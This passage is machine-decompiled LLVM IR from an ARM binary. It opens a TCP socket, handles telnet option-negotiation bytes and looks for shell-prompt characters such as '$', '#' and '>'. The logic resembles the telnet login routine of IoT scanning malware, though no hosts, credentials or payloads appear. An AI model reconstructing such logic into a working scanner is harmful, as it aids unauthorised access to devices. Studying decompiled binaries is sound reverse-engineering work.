  %v3_f5b4 = call i32 @function_10248(i32 10, i32* nonnull %stack_var_-60)
  %v3_f5b8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f5b4, i32* %r2.global-to-local, align 4
  %v1_f5c0 = add i32 %v3_f5b8, -1
  store i32 %v1_f5c0, i32* %r3.global-to-local, align 4
  %v0_f5c4 = load i32, i32* @fp, align 4
  store i32 %v0_f5c4, i32* %r0.global-to-local, align 4
  %v0_f5c8 = load i32, i32* @r6, align 4
  %v1_f5c8 = add i32 %v0_f5c8, 24
  %v2_f5c8 = inttoptr i32 %v1_f5c8 to i32*
  %v3_f5c8 = load i32, i32* %v2_f5c8, align 4
  store i32 %v3_f5c8, i32* %r1.global-to-local, align 4
  %v4_f5cc = call i32 @function_10904(i32 %v0_f5c4, i32 %v3_f5c8, i32 %v3_f5b4, i32 %v1_f5c0)
  %v3_f5d0 = icmp eq i32 %v4_f5cc, -1
  store i1 %v3_f5d0, i1* %cpsr_c.global-to-local, align 1
  %v8_f5d0 = icmp eq i32 %v4_f5cc, -1
  store i1 %v8_f5d0, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f5dc = call i32 @function_1026c(i32 10)
  br i1 %v3_f5d0, label %dec_label_pc_f5d8, label %dec_label_pc_ff60

dec_label_pc_f5d8:                                ; preds = %dec_label_pc_f5a0
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f5e4 = call i32 @function_1030c(i32 9)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f5f4 = call i32 @function_10248(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f5f4, i32* %r0.global-to-local, align 4
  %v3_f5f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f5f4, i32* %r2.global-to-local, align 4
  %v1_f600 = add i32 %v3_f5f8, -1
  store i32 %v1_f600, i32* %r3.global-to-local, align 4
  %v0_f604 = load i32, i32* @r6, align 4
  %v1_f604 = add i32 %v0_f604, 24
  %v2_f604 = inttoptr i32 %v1_f604 to i32*
  %v3_f604 = load i32, i32* %v2_f604, align 4
  store i32 %v3_f604, i32* %r1.global-to-local, align 4
  %v0_f608 = load i32, i32* @fp, align 4
  store i32 %v0_f608, i32* %r0.global-to-local, align 4
  %v4_f60c = call i32 @function_10904(i32 %v0_f608, i32 %v3_f604, i32 %v3_f5f4, i32 %v1_f600)
  store i32 %v4_f60c, i32* @r8, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f618 = call i32 @function_1026c(i32 9)
  store i32 %v1_f618, i32* @r0, align 4
  %v0_f61c = load i32, i32* @r8, align 4
  %v2_f61c = icmp eq i32 %v0_f61c, -1
  store i1 %v2_f61c, i1* %cpsr_c.global-to-local, align 1
  %v7_f61c = icmp eq i32 %v0_f61c, -1
  store i1 %v7_f61c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f61c, label %dec_label_pc_f478.loopexit, label %dec_label_pc_f624

dec_label_pc_f624:                                ; preds = %dec_label_pc_f5d8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f624 = icmp eq i32 %v0_f61c, 0
  store i1 %v2_f624, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp slt i32 %v0_f61c, 1
  br i1 %tmp426, label %dec_label_pc_f6e4, label %dec_label_pc_f62c

dec_label_pc_f62c:                                ; preds = %dec_label_pc_f624
  %v0_f62c = load i32, i32* @r6, align 4
  %v1_f62c = add i32 %v0_f62c, 20
  %v2_f62c = inttoptr i32 %v1_f62c to i16*
  %v3_f62c = load i16, i16* %v2_f62c, align 2
  %v4_f62c = zext i16 %v3_f62c to i32
  store i32 %v4_f62c, i32* %r3.global-to-local, align 4
  %v1_f630 = add i32 %v0_f62c, 16
  %v2_f630 = inttoptr i32 %v1_f630 to i32*
  %v3_f630 = load i32, i32* %v2_f630, align 4
  store i32 %v3_f630, i32* %r2.global-to-local, align 4
  store i32 %v2_f634, i32* @lr, align 4
  store i32 %v4_f62c, i32* %stack_var_-42, align 4
  store i32 %v3_f630, i32* %stack_var_-60, align 4
  %v1_f640 = inttoptr i32 %v0_f62c to i32*
  %v2_f640 = load i32, i32* %v1_f640, align 4
  store i32 %v2_f640, i32* @sb, align 4
  %v0_f644 = call i32 @function_10ffc()
  store i32 %v0_f644, i32* %r0.global-to-local, align 4
  %v7_f648 = icmp eq i32 %v0_f644, -1
  %.465 = zext i1 %v7_f648 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f654 = icmp eq i32 %v0_f644, 0
  store i1 %v2_f654, i1* %cpsr_z.global-to-local, align 1
  %tmp429 = icmp slt i32 %v0_f644, 1
  br i1 %tmp429, label %bb430, label %.thread84

.thread84:                                        ; preds = %dec_label_pc_f62c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6cc

bb430:                                            ; preds = %dec_label_pc_f62c
  store i32 %.465, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f660 = icmp eq i1 %v7_f648, false
  store i1 %v2_f660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f660, label %dec_label_pc_f668, label %dec_label_pc_f6cc

dec_label_pc_f668:                                ; preds = %bb430
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f674 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_f674, i32* %r0.global-to-local, align 4
  %v2_f678 = icmp eq i32 %v3_f674, -1
  store i1 %v2_f678, i1* %cpsr_c.global-to-local, align 1
  %v7_f678 = icmp eq i32 %v3_f674, -1
  store i1 %v7_f678, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f674, i32* @r5, align 4
  br i1 %v7_f678, label %dec_label_pc_101f4, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f668
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f688 = call i32 @function_1030c(i32 2)
  store i32 ptrtoint ([22 x i8]* @global_var_16680.74 to i32), i32* %r0.global-to-local, align 4
  %v2_f690 = call i32 @function_e368(i32 ptrtoint ([22 x i8]* @global_var_16680.74 to i32))
  store i32 %v2_f690, i32* %r0.global-to-local, align 4
  store i32 %v2_f690, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f694 = icmp eq i32 %v2_f690, 0
  store i1 %v3_f694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f694, label %dec_label_pc_f69c, label %dec_label_pc_100dc

dec_label_pc_f69c:                                ; preds = %dec_label_pc_f684
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 %v2_f634, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_16698.80 to i32), i32* @r0, align 4
  %v2_f6ac = call i32 @function_11874(i32 ptrtoint ([15 x i8]* @global_var_16698.80 to i32))
  %v0_f6b0 = load i32, i32* @r7, align 4
  store i32 %v0_f6b0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f6bc = inttoptr i32 %v0_f6b0 to i32*
  %v3_f6bc = call i32 @function_10248(i32 2, i32* %v2_f6bc)
  %v4_f6bc = inttoptr i32 %v3_f6bc to i16*
  store i32 %v3_f6bc, i32* %r0.global-to-local, align 4
  %v3_f6c0 = load i16, i16* %v4_f6bc, align 2
  %v4_f6c0 = zext i16 %v3_f6c0 to i32
  store i32 %v4_f6c0, i32* %r0.global-to-local, align 4
  store i32 %v2_f634, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f6cc

dec_label_pc_f6cc:                                ; preds = %.thread84, %bb430, %dec_label_pc_f69c
  %v0_f6cc = load i32, i32* @r6, align 4
  %v1_f6cc = add i32 %v0_f6cc, 4
  %v2_f6cc = inttoptr i32 %v1_f6cc to i32*
  %v3_f6cc = load i32, i32* %v2_f6cc, align 4
  store i32 %v3_f6cc, i32* %r0.global-to-local, align 4
  %v1_f6d0 = call i32 @function_1130c(i32 %v3_f6cc)
  store i32 %v1_f6d0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f6dc = load i32, i32* @r6, align 4
  %v2_f6dc = add i32 %v1_f6dc, 4
  %v3_f6dc = inttoptr i32 %v2_f6dc to i32*
  store i32 -1, i32* %v3_f6dc, align 4
  %v0_f6e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f6e0 = load i32, i32* @r6, align 4
  %v2_f6e0 = add i32 %v1_f6e0, 12
  %v3_f6e0 = inttoptr i32 %v2_f6e0 to i32*
  store i32 %v0_f6e0, i32* %v3_f6e0, align 4
  br label %dec_label_pc_f6e4

dec_label_pc_f6e4:                                ; preds = %dec_label_pc_f8a8, %bb439, %dec_label_pc_fe74, %dec_label_pc_f624, %dec_label_pc_ff18, %dec_label_pc_fc64, %dec_label_pc_f6cc
  %v0_f6e4 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6e4 = icmp eq i32 %v0_f6e4, 0
  store i1 %v2_f6e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6e4, label %dec_label_pc_f478.loopexit, label %dec_label_pc_f6ec

dec_label_pc_f6ec:                                ; preds = %dec_label_pc_f6e4, %dec_label_pc_fd18, %dec_label_pc_fb58, %dec_label_pc_fa08, %dec_label_pc_f934, %dec_label_pc_f790, %dec_label_pc_ffec, %dec_label_pc_ff90
  %v0_f6ec = load i32, i32* @r6, align 4
  %v1_f6ec = add i32 %v0_f6ec, 24
  %v2_f6ec = inttoptr i32 %v1_f6ec to i32*
  %v3_f6ec = load i32, i32* %v2_f6ec, align 4
  %v0_f6f0 = load i32, i32* @r8, align 4
  %v2_f6f0 = sub i32 %v0_f6f0, %v3_f6ec
  %v3_f6f0 = icmp uge i32 %v0_f6f0, %v3_f6ec
  store i1 %v3_f6f0, i1* %cpsr_c.global-to-local, align 1
  %v4_f6f0 = xor i32 %v0_f6f0, %v3_f6ec
  %v5_f6f0 = xor i32 %v2_f6f0, %v0_f6f0
  %v6_f6f0 = and i32 %v5_f6f0, %v4_f6f0
  %v7_f6f0 = icmp slt i32 %v6_f6f0, 0
  %v8_f6f0 = icmp slt i32 %v2_f6f0, 0
  %v9_f6f0 = icmp eq i32 %v0_f6f0, %v3_f6ec
  store i1 %v9_f6f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f6f4 = xor i1 %v8_f6f0, %v7_f6f0
  %v0_f6f0.v3_f6ec = select i1 %v2_f6f4, i32 %v0_f6f0, i32 %v3_f6ec
  store i32 %v0_f6f0.v3_f6ec, i32* %r1.global-to-local, align 4
  %v2_f6fc = sub i32 %v3_f6ec, %v0_f6f0.v3_f6ec
  store i32 %v2_f6fc, i32* @r2, align 4
  store i32 %v2_f6fc, i32* %v2_f6ec, align 4
  %v0_f704 = load i32, i32* @fp, align 4
  %v1_f704 = load i32, i32* %r1.global-to-local, align 4
  %v2_f704 = add i32 %v1_f704, %v0_f704
  store i32 %v2_f704, i32* @r1, align 4
  store i32 %v0_f704, i32* @r0, align 4
  %v3_f70c = call i32 @function_11830(i32 %v0_f704, i32 %v2_f704, i32 %v2_f6fc)
  store i32 %v3_f70c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4fc

dec_label_pc_f714:                                ; preds = %dec_label_pc_f4fc
  %v1_f714 = add i32 %v0_f4fc, 24
  %v2_f714 = inttoptr i32 %v1_f714 to i32*
  %v3_f714 = load i32, i32* %v2_f714, align 4
  store i32 %v3_f714, i32* %r2.global-to-local, align 4
  %v1_f718 = add i32 %v3_f714, -1
  store i32 %v1_f718, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f71c = icmp eq i32 %v1_f718, 0
  store i1 %v2_f71c, i1* %cpsr_z.global-to-local, align 1
  %tmp433 = icmp slt i32 %v1_f718, 1
  br i1 %tmp433, label %dec_label_pc_f47c.backedge.thread, label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f714
  %v2_f724 = add i32 %v1_f718, %v0_f4fc
  store i32 %v2_f724, i32* %r3.global-to-local, align 4
  %v1_f728 = add i32 %v2_f724, 28
  %v2_f728 = inttoptr i32 %v1_f728 to i8*
  %v3_f728 = load i8, i8* %v2_f728, align 1
  %v4_f728 = zext i8 %v3_f728 to i32
  store i32 %v4_f728, i32* %r3.global-to-local, align 4
  %v2_f72c = icmp ugt i8 %v3_f728, 61
  store i1 %v2_f72c, i1* %cpsr_c.global-to-local, align 1
  %v7_f72c = icmp eq i8 %v3_f728, 62
  store i1 %v7_f72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f72c, label %dec_label_pc_f790, label %bb434

bb434:                                            ; preds = %dec_label_pc_f724
  %v3_f730 = icmp ugt i8 %v3_f728, 57
  store i1 %v3_f730, i1* %cpsr_c.global-to-local, align 1
  %v8_f730 = icmp eq i8 %v3_f728, 58
  store i1 %v8_f730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f730, label %dec_label_pc_f790, label %dec_label_pc_f738

dec_label_pc_f738:                                ; preds = %bb434
  %v2_f738 = icmp ugt i8 %v3_f728, 35
  store i1 %v2_f738, i1* %cpsr_c.global-to-local, align 1
  %v7_f738 = icmp eq i8 %v3_f728, 36
  store i1 %v7_f738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f738, label %dec_label_pc_f790, label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f738
  %v2_f740 = icmp ugt i8 %v3_f728, 34
  store i1 %v2_f740, i1* %cpsr_c.global-to-local, align 1
  %v7_f740 = icmp eq i8 %v3_f728, 35
  store i1 %v7_f740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f740, label %dec_label_pc_f790, label %dec_label_pc_f748

dec_label_pc_f748:                                ; preds = %dec_label_pc_f740
  %v2_f748 = icmp ugt i8 %v3_f728, 36
  store i1 %v2_f748, i1* %cpsr_c.global-to-local, align 1
  %v7_f748 = icmp eq i8 %v3_f728, 37
  store i1 %v7_f748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f748, label %dec_label_pc_f790, label %dec_label_pc_f778.preheader

dec_label_pc_f778.preheader:                      ; preds = %dec_label_pc_f748
  %v3_f74c = add i32 %v0_f4fc, 28
  %v2_f750 = add i32 %v3_f74c, %v3_f714
  store i32 %v2_f750, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f778

dec_label_pc_f75c:                                ; preds = %bb435
  %v2_f75c = icmp ugt i8 %v3_f780, 35
  store i1 %v2_f75c, i1* %cpsr_c.global-to-local, align 1
  %v7_f75c = icmp eq i8 %v3_f780, 36
  store i1 %v7_f75c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f75c, label %dec_label_pc_f790, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f75c
  %v2_f764 = icmp ugt i8 %v3_f780, 34
  store i1 %v2_f764, i1* %cpsr_c.global-to-local, align 1
  %v7_f764 = icmp eq i8 %v3_f780, 35
  store i1 %v7_f764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f764, label %dec_label_pc_f790, label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f764
  %v2_f76c = icmp ugt i8 %v3_f780, 36
  store i1 %v2_f76c, i1* %cpsr_c.global-to-local, align 1
  %v7_f76c = icmp eq i8 %v3_f780, 37
  store i1 %v7_f76c, i1* %cpsr_z.global-to-local, align 1
  %v1_f770 = add i32 %v0_f770, -1
  store i32 %v1_f770, i32* %r3.global-to-local, align 4
  br i1 %v7_f76c, label %dec_label_pc_f790, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f778.preheader, %dec_label_pc_f76c
  %v0_f770 = phi i32 [ %v2_f750, %dec_label_pc_f778.preheader ], [ %v1_f770, %dec_label_pc_f76c ]
  %v0_f778 = phi i32 [ %v1_f718, %dec_label_pc_f778.preheader ], [ %v1_f778, %dec_label_pc_f76c ]
  %v1_f778 = add i32 %v0_f778, -1
  store i32 %v1_f778, i32* %r1.global-to-local, align 4
  %v2_f778 = icmp ne i32 %v0_f778, 0
  store i1 %v2_f778, i1* %cpsr_c.global-to-local, align 1
  %v7_f778 = icmp eq i32 %v0_f778, 1
  store i1 %v7_f778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f778, label %dec_label_pc_f47c.backedge.thread565, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f778
  %v1_f780 = add i32 %v0_f770, -2
  %v2_f780 = inttoptr i32 %v1_f780 to i8*
  %v3_f780 = load i8, i8* %v2_f780, align 1
  %v4_f780 = zext i8 %v3_f780 to i32
  store i32 %v4_f780, i32* %r2.global-to-local, align 4
  %v2_f784 = icmp ugt i8 %v3_f780, 61
  store i1 %v2_f784, i1* %cpsr_c.global-to-local, align 1
  %v7_f784 = icmp eq i8 %v3_f780, 62
  store i1 %v7_f784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f784, label %dec_label_pc_f790, label %bb435

bb435:                                            ; preds = %dec_label_pc_f780
  %v3_f788 = icmp ugt i8 %v3_f780, 57
  store i1 %v3_f788, i1* %cpsr_c.global-to-local, align 1
  %v8_f788 = icmp eq i8 %v3_f780, 58
  store i1 %v8_f788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f788, label %dec_label_pc_f790, label %dec_label_pc_f75c

dec_label_pc_f790:                                ; preds = %dec_label_pc_f780, %bb435, %dec_label_pc_f76c, %dec_label_pc_f764, %dec_label_pc_f75c, %dec_label_pc_f748, %dec_label_pc_f724, %dec_label_pc_f740, %dec_label_pc_f738, %bb434
  %v0_f794 = phi i32 [ %v1_f718, %dec_label_pc_f748 ], [ %v1_f718, %dec_label_pc_f724 ], [ %v1_f718, %dec_label_pc_f740 ], [ %v1_f718, %dec_label_pc_f738 ], [ %v1_f718, %bb434 ], [ %v1_f778, %dec_label_pc_f75c ], [ %v1_f778, %dec_label_pc_f764 ], [ %v1_f778, %dec_label_pc_f76c ], [ %v1_f778, %bb435 ], [ %v1_f778, %dec_label_pc_f780 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f794 = add i32 %v0_f794, 1
  store i32 %v1_f794, i32* @r8, align 4
  %v1_f798 = call i32 @function_1030c(i32 8)
  store i32 %v2_fe00, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f7a8 = call i32 @function_10248(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f7a8, i32* %r0.global-to-local, align 4
  %v3_f7ac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f7ac, i32* %r2.global-to-local, align 4
  store i32 %v3_f7a8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f7b8 = load i32, i32* @r6, align 4
  %v1_f7b8 = add i32 %v0_f7b8, 4
  %v2_f7b8 = inttoptr i32 %v1_f7b8 to i32*
  %v3_f7b8 = load i32, i32* %v2_f7b8, align 4
  store i32 %v3_f7b8, i32* %r0.global-to-local, align 4
  %v4_f7bc = call i32 @function_11a30(i32 %v3_f7b8, i32 %v3_f7a8, i32 %v3_f7ac, i32 16384)
  store i32 %v4_f7bc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f7cc = load i32, i32* @r6, align 4
  %v1_f7cc = add i32 %v0_f7cc, 4
  %v2_f7cc = inttoptr i32 %v1_f7cc to i32*
  %v3_f7cc = load i32, i32* %v2_f7cc, align 4
  store i32 %v3_f7cc, i32* %r0.global-to-local, align 4
  %v4_f7d0 = call i32 @function_11a30(i32 %v3_f7cc, i32 ptrtoint ([3 x i8]* @global_var_1673c.190 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f7d8 = call i32 @function_1026c(i32 8)
  store i32 %v1_f7d8, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f7e0 = load i32, i32* @r6, align 4
  %v2_f7e0 = add i32 %v1_f7e0, 12
  %v3_f7e0 = inttoptr i32 %v2_f7e0 to i32*
  store i32 10, i32* %v3_f7e0, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_f7e8:                                ; preds = %dec_label_pc_f4fc
  %v1_f7e8 = add i32 %v0_f4fc, 24
  %v2_f7e8 = inttoptr i32 %v1_f7e8 to i32*
  %v3_f7e8 = load i32, i32* %v2_f7e8, align 4
  store i32 %v3_f7e8, i32* %r1.global-to-local, align 4
  %v0_f7ec = load i32, i32* @fp, align 4
  store i32 %v0_f7ec, i32* @r4, align 4
  store i32 0, i32* @r8, align 4
  %v3_f7f4172 = icmp eq i32 %v3_f7e8, 0
  store i1 %v3_f7f4172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f7f4172, i1* %cpsr_z.global-to-local, align 1
  %v6_f7f8179 = icmp sgt i32 %v3_f7e8, 0
  br i1 %v6_f7f8179, label %dec_label_pc_f7fc.preheader, label %dec_label_pc_f8a8

dec_label_pc_f7f4.loopexit:                       ; preds = %dec_label_pc_f818
  %v2_f820 = add i32 %v1_f820, 2
  store i32 %v2_f820, i32* @r4, align 4
  %v2_f824 = add i32 %v1_f824, 2
  store i32 %v2_f824, i32* @r8, align 4
  %v3_f7f4 = icmp uge i32 %v2_f824, %v1_f7f4
  store i1 %v3_f7f4, i1* %cpsr_c.global-to-local, align 1
  %v9_f7f4 = icmp eq i32 %v2_f824, %v1_f7f4
  store i1 %v9_f7f4, i1* %cpsr_z.global-to-local, align 1
  %v6_f7f8 = icmp slt i32 %v2_f824, %v1_f7f4
  br i1 %v6_f7f8, label %dec_label_pc_f7fc.preheader, label %dec_label_pc_f8a8

dec_label_pc_f7fc.preheader:                      ; preds = %dec_label_pc_f7e8, %dec_label_pc_f7f4.loopexit
  %v6_f8b0277 = phi i32 [ %v6_f8b0278, %dec_label_pc_f7f4.loopexit ], [ %v0_f4fc, %dec_label_pc_f7e8 ]
  %v1_f824266 = phi i32 [ %v2_f824, %dec_label_pc_f7f4.loopexit ], [ 0, %dec_label_pc_f7e8 ]
  %v1_f808264 = phi i32 [ %v1_f7f4, %dec_label_pc_f7f4.loopexit ], [ %v3_f7e8, %dec_label_pc_f7e8 ]
  %v0_f7fc262 = phi i32 [ %v2_f820, %dec_label_pc_f7f4.loopexit ], [ %v0_f7ec, %dec_label_pc_f7e8 ]
  br label %dec_label_pc_f7fc

dec_label_pc_f7fc:                                ; preds = %dec_label_pc_f7fc.preheader, %dec_label_pc_f88c
  %v6_f8b0278 = phi i32 [ %v6_f8b0277, %dec_label_pc_f7fc.preheader ], [ %v0_f894, %dec_label_pc_f88c ]
  %v1_f824 = phi i32 [ %v1_f824266, %dec_label_pc_f7fc.preheader ], [ %v1_f898, %dec_label_pc_f88c ]
  %v1_f7f4 = phi i32 [ %v1_f808264, %dec_label_pc_f7fc.preheader ], [ %v3_f894, %dec_label_pc_f88c ]
  %v1_f820 = phi i32 [ %v0_f7fc262, %dec_label_pc_f7fc.preheader ], [ %v1_f8a0, %dec_label_pc_f88c ]
  %v1_f7fc = inttoptr i32 %v1_f820 to i8*
  %v2_f7fc = load i8, i8* %v1_f7fc, align 1
  %v3_f7fc = zext i8 %v2_f7fc to i32
  store i32 %v3_f7fc, i32* @r3, align 4
  %v2_f800 = icmp eq i8 %v2_f7fc, -1
  store i1 %v2_f800, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f800, label %dec_label_pc_f808, label %dec_label_pc_f8a8

dec_label_pc_f808:                                ; preds = %dec_label_pc_f7fc
  %v0_f808 = load i32, i32* @fp, align 4
  %v2_f808 = add i32 %v0_f808, %v1_f7f4
  store i32 %v2_f808, i32* %r2.global-to-local, align 4
  %v1_f80c = add i32 %v1_f820, 1
  store i32 %v1_f80c, i32* @r5, align 4
  %v3_f810 = icmp uge i32 %v2_f808, %v1_f80c
  store i1 %v3_f810, i1* %cpsr_c.global-to-local, align 1
  %v9_f810 = icmp eq i32 %v2_f808, %v1_f80c
  store i1 %v9_f810, i1* %cpsr_z.global-to-local, align 1
  %v2_f814 = xor i1 %v3_f810, true
  %v3_f814 = or i1 %v9_f810, %v2_f814
  br i1 %v3_f814, label %dec_label_pc_f8a8, label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %dec_label_pc_f808
  %v2_f818 = inttoptr i32 %v1_f80c to i8*
  %v3_f818 = load i8, i8* %v2_f818, align 1
  %v4_f818 = zext i8 %v3_f818 to i32
  store i32 %v4_f818, i32* @r3, align 4
  %v2_f81c = icmp eq i8 %v3_f818, -1
  store i1 %v2_f81c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f81c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f81c, label %dec_label_pc_f7f4.loopexit, label %dec_label_pc_f82c

dec_label_pc_f82c:                                ; preds = %dec_label_pc_f818
  %v2_f82c = icmp ugt i8 %v3_f818, -4
  store i1 %v2_f82c, i1* %cpsr_c.global-to-local, align 1
  %v7_f82c = icmp eq i8 %v3_f818, -3
  store i1 %v7_f82c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f82c, label %dec_label_pc_fe90, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %dec_label_pc_f82c
  %v1_f834 = add i32 %v1_f820, 2
  store i32 %v1_f834, i32* @r3, align 4
  %v3_f838 = icmp uge i32 %v2_f808, %v1_f834
  store i1 %v3_f838, i1* %cpsr_c.global-to-local, align 1
  %v9_f838 = icmp eq i32 %v2_f808, %v1_f834
  store i1 %v9_f838, i1* %cpsr_z.global-to-local, align 1
  %v2_f83c = xor i1 %v3_f838, true
  %v3_f83c = or i1 %v9_f838, %v2_f83c
  br i1 %v3_f83c, label %dec_label_pc_f8a8, label %dec_label_pc_f840

dec_label_pc_f840:                                ; preds = %dec_label_pc_fef4, %bb459, %.thread145, %dec_label_pc_f834
  %v0_f840 = load i32, i32* @r5, align 4
  %v1_f840 = inttoptr i32 %v0_f840 to i8*
  %v2_f840 = load i8, i8* %v1_f840, align 1
  %v3_f840 = zext i8 %v2_f840 to i32
  store i32 %v3_f840, i32* %r3.global-to-local, align 4
  %v2_f844 = icmp ugt i8 %v2_f840, -4
  store i1 %v2_f844, i1* %cpsr_c.global-to-local, align 1
  %v7_f844 = icmp eq i8 %v2_f840, -3
  store i1 %v7_f844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f844, label %.thread95, label %dec_label_pc_f854

.thread95:                                        ; preds = %dec_label_pc_f840
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f840, align 1
  %v0_f850.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f850.pr.pr, label %.thread98, label %.thread95.dec_label_pc_f854thread-pre-split_crit_edge

.thread95.dec_label_pc_f854thread-pre-split_crit_edge: ; preds = %.thread95
  %v0_f854.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f854

dec_label_pc_f854:                                ; preds = %dec_label_pc_f840, %.thread95.dec_label_pc_f854thread-pre-split_crit_edge
  %v0_f854.pr = phi i32 [ %v0_f854.pr.pre, %.thread95.dec_label_pc_f854thread-pre-split_crit_edge ], [ %v3_f840, %dec_label_pc_f840 ]
  %v2_f854 = icmp ugt i32 %v0_f854.pr, 250
  store i1 %v2_f854, i1* %cpsr_c.global-to-local, align 1
  %v7_f854 = icmp eq i32 %v0_f854.pr, 251
  store i1 %v7_f854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f854, label %bb436, label %.thread98

bb436:                                            ; preds = %dec_label_pc_f854
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f85c = load i32, i32* @r5, align 4
  %v4_f85c = inttoptr i32 %v3_f85c to i8*
  store i8 -3, i8* %v4_f85c, align 1
  br label %.thread98

.thread98:                                        ; preds = %dec_label_pc_f854, %.thread95, %bb436
  %v0_f860 = load i32, i32* @r4, align 4
  %v1_f860 = add i32 %v0_f860, 2
  %v2_f860 = inttoptr i32 %v1_f860 to i8*
  %v3_f860 = load i8, i8* %v2_f860, align 1
  %v4_f860 = zext i8 %v3_f860 to i32
  store i32 %v4_f860, i32* %r3.global-to-local, align 4
  %v2_f864 = icmp ugt i8 %v3_f860, -4
  store i1 %v2_f864, i1* %cpsr_c.global-to-local, align 1
  %v7_f864 = icmp eq i8 %v3_f860, -3
  store i1 %v7_f864, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f864, label %.thread99, label %dec_label_pc_f874

.thread99:                                        ; preds = %.thread98
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f860, align 1
  %v0_f870.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f870.pr.pr, label %.thread102, label %.thread99.dec_label_pc_f874thread-pre-split_crit_edge

.thread99.dec_label_pc_f874thread-pre-split_crit_edge: ; preds = %.thread99
  %v0_f874.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f874

